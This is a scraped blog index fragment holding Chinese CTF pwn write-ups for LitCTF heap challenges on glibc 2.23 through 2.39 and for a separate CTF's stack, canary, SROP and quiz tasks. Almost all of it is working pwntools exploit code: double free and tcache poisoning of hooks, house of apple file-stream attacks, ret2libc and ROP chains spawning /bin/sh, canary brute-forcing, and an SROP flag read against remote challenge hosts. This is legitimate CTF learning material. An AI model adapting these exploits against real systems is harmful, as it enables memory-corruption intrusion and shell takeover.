          &lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_41359358/article/details/138281097?spm=1001.2101.3001.6650.2&amp;amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EYuanLiJiHua%7EPosition-2-138281097-blog-121539726.235%5Ev43%5Epc_blog_bottom_relevance_base4&amp;amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EYuanLiJiHua%7EPosition-2-138281097-blog-121539726.235%5Ev43%5Epc_blog_bottom_relevance_base4&amp;amp;utm_relevant_index=5&#34;&gt;一遍过&lt;/a&gt;&lt;/p&gt;
">kali磁盘不足问题</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/litctf/"" data-c="
          &lt;h1 id=&#34;heap-223&#34;&gt;heap-2.23&lt;/h1&gt;
&lt;p&gt;2.23的libc,存在uaf漏洞和edit功能(都是一个附件，只是换了libc版本)这里选择double free改malloc_hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./heap&amp;quot;)
p = remote(&#39;node3.anna.nssctf.cn&#39;,28694)
elf = ELF(&amp;quot;./heap&amp;quot;)

def add(idx,size):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;size? &amp;quot;)
	p.sendline(str(size))
    
def dele(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	
def edit(idx,string):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;4&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;content : \n&amp;quot;)
	p.sendline(string)
	
def show(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))

def exit():
	p.recvuntil(&amp;quot;choice\n&amp;quot;)
	p.sendline(&amp;quot;5&amp;quot;)
	
add(0,1060)
add(2,0x68)
add(3,0x68)
add(1,16)
dele(0)
show(0)
main = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
base = main - 3951480
onegadget = [0x4527a,0xf03a4,0xf1247]
one_gadget = base + onegadget[2]
malloc_hook = main - 88 - 0x10

print(hex(malloc_hook))
dele(2)
dele(3)
dele(2)
edit(2,p64(main - 139))
add(4,0x68)
add(5,0x68)
edit(5,b&#39;a&#39;*19 + p64(one_gadget))
print(hex(malloc_hook))
#gdb.attach(p)
add(7,0x10)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;heap-227&#34;&gt;heap-2.27&lt;/h1&gt;
&lt;p&gt;这里选择tcache poisoning&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./heap&amp;quot;)
p = remote(&#39;node2.anna.nssctf.cn&#39;,28077)
#elf = ELF(&amp;quot;./heap&amp;quot;)

def add(idx,size):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;size? &amp;quot;)
	p.sendline(str(size))
    
def dele(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	
def edit(idx,string):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;4&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;content : \n&amp;quot;)
	p.sendline(string)
	
def show(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))

def exit():
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;5&amp;quot;)
#gdb.attach(p,$rebase&#39;0x178B&#39;)	
add(0,1060)
add(2,0x68)
add(3,0x68)
add(1,16)
dele(0)
show(0)
main = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
base = main - 4111520

onegadget = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]
one_gadget = base + onegadget[3]
malloc_hook = main - 96 - 0x10

dele(2)
dele(3)

edit(3,p64(malloc_hook))
add(4,0x68)
add(5,0x68)
edit(5,p64(one_gadget))
print(&amp;quot;one_gadget = &amp;quot;,hex(one_gadget))
#gdb.attach(p)	
print(&amp;quot;malloc_hook = &amp;quot;,hex(malloc_hook))
add(10,0x10)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;heap-231&#34;&gt;heap-2.31&lt;/h1&gt;
&lt;p&gt;这里打exit hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./heap&amp;quot;)
p = remote(&#39;node3.anna.nssctf.cn&#39;,28424)
elf = ELF(&amp;quot;./heap&amp;quot;)

def add(idx,size):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;size? &amp;quot;)
	p.sendline(str(size))
    
def dele(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	
def edit(idx,string):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;4&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;content : \n&amp;quot;)
	p.sendline(string)
	
def show(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))

def exit():
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;5&amp;quot;)
#gdb.attach(p,$rebase&#39;0x178B&#39;)	
add(0,1060)
add(2,0x68)
add(3,0x68)
add(1,16)
dele(0)
show(0)
main = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
base = main - 2018272

ld_base = base + 2236416
print(&amp;quot;ld_base = &amp;quot;,hex(ld_base))
_dl_rtld_lock_recursive = ld_base + 0xf60 + 8
_dl_rtld_unlock_recursive = _dl_rtld_lock_recursive + 8
_dl_load_lock = _dl_rtld_unlock_recursive - 0x608
__libc_atexit = base + 0x1ED608

onegadget = [0xe3afe,0xe3b01,0xe3b04]
one_gadget = base + onegadget[0]
malloc_hook = main - 88 - 0x10
print(&amp;quot;_dl_rtld_lock_recursive = &amp;quot;,hex(_dl_rtld_lock_recursive))

dele(2)
dele(3)

edit(3,p64(_dl_rtld_lock_recursive))
add(4,0x68)
add(5,0x68)
edit(5,p64(one_gadget))
print(&amp;quot;one_gadget = &amp;quot;,hex(one_gadget))
#gdb.attach(p)	
print(&amp;quot;malloc_hook = &amp;quot;,hex(malloc_hook))
exit()
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;heap-235&#34;&gt;heap-2.35&lt;/h1&gt;
&lt;p&gt;该版本无法使用hook，打堆栈结合，通过&lt;code&gt;p &amp;amp;environ&lt;/code&gt;泄露栈地址，直接申请ret地址会有对齐错误，这里有ptr的bss段保存着堆地址，申请到这里然后改掉指针打ROP&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./heap&amp;quot;)
#p = remote(&#39;node2.anna.nssctf.cn&#39;,28077)
#elf = ELF(&amp;quot;./heap&amp;quot;)

def add(idx,size):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;size? &amp;quot;)
	p.sendline(str(size))
    
def dele(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	
def edit(idx,string):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;4&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;content : \n&amp;quot;)
	p.send(string)
	
def show(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))

def exit():
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;5&amp;quot;)
	
add(0,1060)
add(2,0x68)
add(3,0x68)
add(1,16)
dele(0)
show(0)
main = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
base = main - 2206944
env = base + 2236928
# env = libc_base + libc.sym[&#39;environ&#39;]
print(&amp;quot;base = &amp;quot;,hex(base))
dele(2)
dele(3)
show(2)
p.recvuntil(b&#39;content : &#39;)
key = u64(p.recv(5).ljust(8,b&#39;\x00&#39;))#288
edit(3,p64(key ^ env))
print(&amp;quot;heap = &amp;quot;,hex(key))
print(&amp;quot;env = &amp;quot;,hex(env))
add(4,0x68)
add(5,0x68)
show(5)
stack = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 288 - 8
print(&amp;quot;stack = &amp;quot;,hex(stack))
add(6,0x78)
add(7,0x78)
dele(6)
dele(7)
edit(7,p64(key ^ stack))

add(8,0x78)
add(9,0x78)
rdi = base + 0x000000000002a3e5
ret = base + 0x0000000000029139
sys = base + 0x0000000000050D70
sh = base + 0x00000000001D8678

pay = b&#39;a&#39;*24

edit(9,pay)
print(&amp;quot;stack = &amp;quot;,hex(stack))
show(9)
bss = u64(p.recvuntil(b&#39;\x55&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x17a1
print(&amp;quot;bss = &amp;quot;,hex(bss))
ptr = bss + 0x4060
print(&amp;quot;ptr = &amp;quot;,hex(ptr))
add(10,0x58)
add(11,0x58)
dele(10)
dele(11)
edit(11,p64(key ^ (ptr + 64)))
add(12,0x58)
add(13,0x58)

edit(13,p64(0) + p64(stack - 32))
pay = b&#39;a&#39;*8 + p64(ret) + p64(rdi) + p64(sh) + p64(sys)
print(&amp;quot;ptr = &amp;quot;,hex(ptr))
#gdb.attach(p)
edit(9,pay)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接下来是打的IO，非常经典，板子中的板子&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
r = process(&#39;./heap&#39;)
e = ELF(&#39;./heap&#39;)
libc = ELF(&#39;./libc.so.6&#39;)  # ubuntu22打本地

one = [0xe6aee, 0xe6af1, 0xe6af4]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b&#39;&amp;gt;&amp;gt;&#39;)
    r.sendline(str(choice).encode())


def add(idx, size):
    cmd(1)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;size? &#39;)
    r.sendline(str(size).encode())


def delete(idx):
    cmd(2)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())


def show(idx):
    cmd(3)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;content : &#39;)


def edit(idx, content=b&#39;deafbeef&#39;):
    cmd(4)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;content : &#39;)
    r.send(content)


def exit():
    cmd(5)

gdb.attach(r,&amp;quot;b *$rebase(0x0000000000017D2)&amp;quot;)
add(8, 0x18)
add(0, 0x510)
add(1, 0x30)  # 0x20的话chunk2的地址是00结尾，printf没法泄露，所以要0x30
add(2, 0x520)
add(3, 0x30)
delete(2)
# dbg()
add(4, 0x530)
show(2)
large = u64(r.recv(6).ljust(8, b&#39;\0&#39;))  # 其实是main_arena+0x490
libcbase = large - 0x670 - libc.sym[&#39;_IO_2_1_stdin_&#39;]
_IO_list_all = libcbase + libc.sym[&#39;_IO_list_all&#39;]
io_wfile_jumps = libcbase + libc.sym[&#39;_IO_wfile_jumps&#39;]
system = libcbase + libc.sym[&#39;system&#39;]

success(&#39;libcbase: &#39; + hex(libcbase))

edit(2, b&#39;A&#39; * 0x10)
# pause()
show(2)
r.recv(0x10)
heap = u64(r.recv(6).ljust(8, b&#39;\0&#39;))
success(&#39;heap: &#39; + hex(heap))

delete(0)

edit(2, p64(large) + p64(large) + p64(heap) + p64(_IO_list_all - 0x20))

add(5, 0x550)
chunk_addr = heap - 0x560  # chunk0的chunk地址 fp地址
#-------------------------house of apple-------------------------
# edit(8, b&#39;A&#39; * 0x10 + p32(0xfffff7f5) + b&#39;;sh\x00&#39;)
# fake_io_file = p64(0)*2 + p64(1) + p64(2)
# fake_io_file = fake_io_file.ljust(
#     0xa0 - 0x10, b&#39;\0&#39;) + p64(chunk_addr + 0x100)  # _wide_data
# fake_io_file = fake_io_file.ljust(
#     0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff)  # _mode
# fake_io_file = fake_io_file.ljust(
#     0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps)  # vtable
# fake_io_file = fake_io_file.ljust(
#     0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(chunk_addr + 0x200)
# fake_io_file = fake_io_file.ljust(
#     0x200 - 0x10, b&#39;\0&#39;) + p64(0)*13 + p64(system)
# edit(0, fake_io_file)
#----------------------------------------------------------------

#-------------------------_IO_obstack_jumps-------------------------
edit(8, b&#39;A&#39; * 0x10 + b&#39;/bin/sh\x00&#39;)
def get_IO_str_jumps():
    IO_file_jumps_addr = libc.sym[&#39;_IO_file_jumps&#39;]
    IO_str_underflow_addr = libc.sym[&#39;_IO_str_underflow&#39;]
    for ref in libc.search(p64(IO_str_underflow_addr-libc.address)):
        possible_IO_str_jumps_addr = ref - 0x20
        if possible_IO_str_jumps_addr &amp;gt; IO_file_jumps_addr:
            return possible_IO_str_jumps_addr
payload = flat(
    {
        0x8:1,
        0x10:0,
        0x38:chunk_addr,
        0x28:system,
        0x18:1,
        0x20:0,
        0x40:1, 
        0xd0:chunk_addr,
        0xc8:libcbase + get_IO_str_jumps() - 0x300 + 0x20
    },
    filler = &#39;\x00&#39;
)
edit(0, payload)
#-----------------------------------------------------------------
# dbg()
exit()# 触发abort()

r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;heap-239&#34;&gt;heap-2.39&lt;/h1&gt;
&lt;p&gt;限制了一下堆块的大小，也是house of apple秒了，就是我kali版本有点低不支持2.39，又整了个22.04的乌班图，&lt;s&gt;好看的雅痞&lt;/s&gt;😊&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
r = process(&#39;./heap&#39;)
e = ELF(&#39;./heap&#39;)
libc = ELF(&#39;./libc.so.6&#39;)  # ubuntu22打本地

one = [0xe6aee, 0xe6af1, 0xe6af4]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b&#39;&amp;gt;&amp;gt;&#39;)
    r.sendline(str(choice).encode())


def add(idx, size):
    cmd(1)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;size? &#39;)
    r.sendline(str(size).encode())


def delete(idx):
    cmd(2)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())


def show(idx):
    cmd(3)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;content : &#39;)


def edit(idx, content=b&#39;deafbeef&#39;):
    cmd(4)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;content : &#39;)
    r.send(content)


def exit():
    cmd(5)

add(8, 0x418)
add(0, 0x510)
add(1, 0x430)
add(2, 0x520)
add(3, 0x430)
delete(2)
add(4, 0x530)
show(2)
large = u64(r.recv(6).ljust(8, b&#39;\0&#39;))  # 其实是main_arena+0x490
libcbase = large - 0x670 - libc.sym[&#39;_IO_2_1_stdin_&#39;]
_IO_list_all = libcbase + libc.sym[&#39;_IO_list_all&#39;]
io_wfile_jumps = libcbase + libc.sym[&#39;_IO_wfile_jumps&#39;]
system = libcbase + libc.sym[&#39;system&#39;]

success(&#39;libcbase: &#39; + hex(libcbase))

edit(2, b&#39;A&#39; * 0x10)
# pause()
show(2)
r.recv(0x10)
heap = u64(r.recv(6).ljust(8, b&#39;\0&#39;))
success(&#39;heap: &#39; + hex(heap))

delete(0)

edit(2, p64(large) + p64(large) + p64(heap) + p64(_IO_list_all - 0x20))
dbg()

add(5, 0x550)
chunk_addr = heap - 0x560 - 1024 # chunk0的chunk地址 fp地址
print(&#39;chunk_addr:&#39;,hex(chunk_addr))
#-------------------------house of apple-------------------------
edit(8, b&#39;A&#39; * 0x410 + p32(0xfffff7f5) + b&#39;;sh\x00&#39;)
fake_io_file = p64(0)*2 + p64(1) + p64(2)
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b&#39;\0&#39;) + p64(chunk_addr + 0x100)  # _wide_data
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps)  # vtable
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(chunk_addr + 0x200)
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b&#39;\0&#39;) + p64(0)*13 + p64(system)
edit(0, fake_io_file)
#----------------------------------------------------------------

#-------------------------_IO_obstack_jumps-------------------------
#edit(8, b&#39;A&#39; * 0x410 + b&#39;/bin/sh\x00&#39;)
#def get_IO_str_jumps():
#    IO_file_jumps_addr = libc.sym[&#39;_IO_file_jumps&#39;]
#    IO_str_underflow_addr = libc.sym[&#39;_IO_str_underflow&#39;]
#    for ref in libc.search(p64(IO_str_underflow_addr-libc.address)):
#        possible_IO_str_jumps_addr = ref - 0x20
#        if possible_IO_str_jumps_addr &amp;gt; IO_file_jumps_addr:
#            return possible_IO_str_jumps_addr
#payload = flat(
#    {
#        0x8:1,
#        0x10:0,
#        0x38:chunk_addr,
#        0x28:system,
#        0x18:1,
#        0x20:0,
#        0x40:1, 
#        0xd0:chunk_addr,
#        0xc8:libcbase + get_IO_str_jumps() - 0x300 + 0x20
#    },
#    filler = &#39;\x00&#39;
#)
#edit(0, payload)
#-----------------------------------------------------------------
# dbg()
exit()# 触发abort()

r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;atm&#34;&gt;ATM&lt;/h1&gt;
&lt;p&gt;ret2libc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./app&amp;quot;)
p = remote(&#39;node1.anna.nssctf.cn&#39;,28849)
	
#
leave = 0x000000000040147c
rdi = 0x0000000000401233
bss = 0x000000000404040 + 0x800
ret = 0x000000000040101a
p.sendafter(b&amp;quot;password:\n&amp;quot;,b&#39;1&#39;)
p.sendafter(b&#39;Exit\n&#39;,b&#39;3&#39;)
p.sendafter(b&#39;deposit:&#39;,b&#39;1000&#39;)
p.sendlineafter(b&#39;Exit\n&#39;,b&#39;5&#39;)
p.recvuntil(b&#39;0x&#39;)
printf = int(p.recv(12),16)
base = printf - 0x000000000060770
print(&amp;quot;base = &amp;quot;,hex(base))
sys = base + 0x000000000050D60
sh = base + 0x0000000001D8698
pay = b&#39;a&#39;*360 + p64(rdi) + p64(sh) + p64(ret) + p64(sys)
p.send(pay)
#gdb.attach(p)
p.sendafter(b&#39;Exit\n&#39;,b&#39;4&#39;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">litctf</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/long-ctf/"" data-c="
          &lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1716968933067.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
痛失壹佰元子😭，第一次ak，出的比较简单&lt;/p&gt;
&lt;h1 id=&#34;pwn&#34;&gt;pwn&lt;/h1&gt;
&lt;h2 id=&#34;stack&#34;&gt;stack&lt;/h2&gt;
&lt;p&gt;查看程序只有一个read且溢出了0x10个字节，打栈迁移，迁移两次，一次泄露libc地址一次得到shell，由于需要再次read所以直接利用main函数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./pwn&amp;quot;)
p = remote(&amp;quot;challenge.qsnctf.com&amp;quot;,31454)
#elf = ELF(&amp;quot;./pwn&amp;quot;)

rdi = 0x0000000000401210
rsi_r15 = 0x0000000000401281
rbp = 0x000000000040115d
bss = 0x0000000000404000 + 0x500
puts = 0x401060
got = 0x000000000404028
leave = 0x00000000004011be

#gdb.attach(p)

payload = b&#39;a&#39;*0x100 + p64(bss + 0x100) + p64(0x00000000040119B)
p.sendafter(&amp;quot;pivoting?\n&amp;quot;,payload)

pay = p64(rdi) + p64(got) + p64(puts) + p64(rbp) + p64(bss+0x300+0x100) + p64(0x00000000040119B)
pay = pay.ljust(0x100,b&#39;\x00&#39;) + p64(bss - 8) + p64(leave)
p.send(pay)
read_addr = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(read_addr))
#base = read_addr - 0x10E1E0#0x00000000010DFC0
libc_base = read_addr - 0x00000000010DFC0
print(hex(libc_base))

#onegadget = [0xe3afe,0xe3b01,0xe3b04]
#one_gadget = libc_base + onegadget[0]

system = libc_base + 0x52290
bin_sh = libc_base + 0x1B45BD
pay3 =(b&#39;a&#39;*8 + p64(rdi) + p64(bin_sh) + p64(rdi+1)+p64(system)).ljust(0x100,b&#39;\x00&#39;)
pay3 += p64(bss+0x300) + p64(leave)
p.send(pay3)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;canary&#34;&gt;canary&lt;/h2&gt;
&lt;p&gt;一直fork，有个栈溢出漏洞，由于fork出的canary不变，所以可以爆破canary，静态编译的程序，可以直接生成ropchain取得shell&lt;br&gt;
相关指令：&lt;br&gt;
&lt;code&gt;ROPgadget --binary pwn --ropchain&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
local = 0
elf = ELF(&#39;./pwn&#39;)

if local:
    io = process(&#39;./pwn&#39;)
    libc = elf.libc

else:
    io = remote(&#39;challenge.qsnctf.com&#39;,31636)
  

io.recvuntil(&#39;input:\n&#39;)
canary = b&#39;\x00&#39;
for k in range(7):          #要爆破的字节数
    for i in range(256):
        payload = b&#39;a&#39;*0x108 + canary + bytes([i])  
        io.send(payload)
        data = io.recvuntil(&amp;quot;input:\n&amp;quot;)  #data接收的是welcome\n前的全部内容
        print(data)
        if b&#39;stack&#39; not in data:
            canary += bytes([i])  
            print(&amp;quot;canary is:&amp;quot; + str(canary))#确保canary为字符串
            break
print(&amp;quot;canary is:&amp;quot;,hex(u64(canary)))
#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b&#39;&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040f23e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c10e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004493d7) # pop rax ; ret
p += b&#39;/bin/sh\x00&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047c4e5) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040f23e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c10e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004437a0) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047c4e5) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004018c2) # pop rdi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c10e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040f23e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c10e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004017cf) # pop rdx ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c10e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004493d7) # pop rax ; ret
p += p64(59)
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004012d3) # syscall
pay = b&#39;&#39;
for i in range(len(p)):
        pay += (ord(p[i:i+1])).to_bytes(1)
#gdb.attach(io)        
payload0 = b&#39;a&#39;*0x108 + canary + p64(0) + pay
print(len(payload0))

io.send(payload0)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;srop_seccomp&#34;&gt;srop_seccomp&lt;/h2&gt;
&lt;p&gt;开了沙盒，允许orw，有mov_rax_0xf和syscall的gadgets，所以打srop并且题目也有提示，第一次read读取了很多，栈迁移到第一次输入的bss段打srop。注意一下偏移即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./chall&amp;quot;)
p = remote(&amp;quot;challenge.qsnctf.com&amp;quot;,31938)
elf = ELF(&amp;quot;./chall&amp;quot;)
mov_rax_0xf = 0x0000000000401194
bss = 0x404020 + 0x800
syscall = 0x40118a
flag = 0x404060
leave = 0x000000000040136c

#gdb.attach(p)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_open
sigframe.rdi = flag
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = 0x404170
sigframe.rip = syscall

sigframe1 = SigreturnFrame()
sigframe1.rax = constants.SYS_read
sigframe1.rdi = 3
sigframe1.rsi = bss - 0x100
sigframe1.rdx = 50
sigframe1.rsp = 0x404278
sigframe1.rip = syscall

sigframe2 = SigreturnFrame()
sigframe2.rax = constants.SYS_write
sigframe2.rdi = 1
sigframe2.rsi = bss - 0x100
sigframe2.rdx = 50
sigframe2.rsp = bss + 0x10 + 256*3
sigframe2.rip = syscall

payload = b&amp;quot;./flag\x00\x00&amp;quot; + p64(0) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe1) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe2)
p.send(payload)

pay = b&#39;a&#39;*42 + p64(flag + 0x8) + p64(leave)
p.sendafter(&#39;SUID?&#39;,pay)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ez_quiz&#34;&gt;ez_quiz&lt;/h2&gt;
&lt;p&gt;c语言伪随机+一点点re，逆向都得到token:&lt;code&gt;DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}&lt;/code&gt;&lt;br&gt;
